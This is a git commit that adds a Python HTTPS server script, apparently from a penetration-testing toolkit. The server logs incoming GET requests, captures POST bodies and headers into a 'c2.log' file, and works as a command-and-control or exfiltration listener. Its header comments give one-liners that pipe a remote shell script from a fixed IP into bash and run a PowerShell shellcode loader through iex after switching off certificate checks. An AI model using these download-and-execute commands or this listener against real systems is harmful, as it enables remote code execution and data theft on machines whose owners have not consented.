dbeeb16f2d5d6214731196c00368999fccfa89c1
aplyc1a <59290222+aplyc1a@users.noreply.github.com>
2021-08-07 21:32:55 -0800

    [add] https服务器，支持GET/POST

---
+++ 0x0F 辅助脚本/MyHTTPSServer.py
@@ -0,0 +1,88 @@
+# openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
+
+# Linux
+'''
+curl https://170.170.13.87:8443/1.sh -k -s|bash
+wget https://170.170.13.87:8443/1.sh --no-check-certificate
+'''
+
+# Windows
+'''
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+iex(New-Object Net.WebClient).DownloadString('https://170.170.13.87:8443/Invoke-Shellcode.ps1')
+
+(New-Object Net.WebClient).DownloadFile('https://170.170.13.87:8443/1.zip','c:\1.zip')
+'''
+
+import ssl, http.server
+import optparse
+import cgi
+import pprint
+import datetime
+
+log_file = "c2.log"
+
+class MyHTTPSServer(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        if self.path[-1] == '/':
+            self.path = '/00000000000000000000404.html'
+        # 192.168.44.1 - - [07/Aug/2021 08:31:33] "GET /favicon.ico HTTP/1.1" 404 -
+        
+        with open(log_file, 'a+', encoding='UTF-8') as f:
+            timenow = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            f.write("------------------------------------------------\n")
+            content = "%s - - [%s] \"%s %s HTTP/1.1\" ??? -" %(self.address_string(), timenow, self.command, self.path)
+            f.write(content+"\n")
+            f.close()
+        return http.server.SimpleHTTPRequestHandler.do_GET(self)
+
+    def do_POST(self):
+        if self.path[-1] == '/':
+            self.path = '/00000000000000000000404.html'
+        req_datas = self.rfile.read(int(self.headers['content-length']))
+        with open(log_file, 'a+', encoding='UTF-8') as f:
+            timenow = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            f.write("------------------------------------------------\n")
+            content = "%s - - [%s] \"%s %s HTTP/1.1\" ??? -" %(self.address_string(), timenow, self.command, self.path)
+            f.write(content+"\n")
+            f.write(str(self.headers))
+            f.write(req_datas.decode())
+            f.close()
+        print(content)
+        # send ?
+        '''
+        data= {
+            'result_code':'2',
+            'result_desc':'Success',
+            'timestamp': '',
+            'data': {'message_id':'25d55ad283aa400af464c76d713c07ad'}
+        }
+        self.send_response(200)
+        self.send_header('Content-type','application/json')
+        self.end_headers()
+        self.wfile.write(json.dumps(data).encode('utf-8'))
+        '''
+        return
+        
+def show_banner():
+    content = "===================================================================================\n  __  __       _    _ _______ _______ _____   _____ _____                          \n |  \\/  |     | |  | |__   __|__   __|  __ \\ / ____/ ____|                         \n | \\  / |_   _| |__| |  | |     | |  | |__) | (___| (___   ___  _ _ __   _____ _ __ \n | |\\/| | | | |  __  |  | |     | |  |  ___/ \\___ \\\\___ \\ / _ \\| '/ \\ \\ / / _ \\ '__|\n | |  | | |_| | |  | |  | |     | |  | |     ____) |___) |  __/| |   \\ V /  __/ |   \n |_|  |_|\\__, |_|  |_|  |_|     |_|  |_|    |_____/_____/ \\___ |_|    \\_/ \\___|_|   \n          __/ |                                                     @aplyc1a       \n         |___/                                                                     \n===================================================================================\n"
+    with open(log_file, 'a+', encoding='UTF-8') as f:
+        f.write(content)
+        print(content)
+        f.close()
+
+def main():
+    parser = optparse.OptionParser('python httpsserver.py -p 8443 ' )
+    parser.add_option('-p', '--port', dest = 'port', type = 'string', help = 'set port of https service.')
+    (options,args) = parser.parse_args()
+    port=options.port
+    
+    Handler = MyHTTPSServer
+
+    httpd = http.server.HTTPServer(('0.0.0.0', int(port)), Handler)
+    httpd.socket = ssl.wrap_socket(httpd.socket, certfile='server.pem', server_side=True)
+    httpd.serve_forever()
+
+if __name__ == '__main__':
+    show_banner()
+    main()
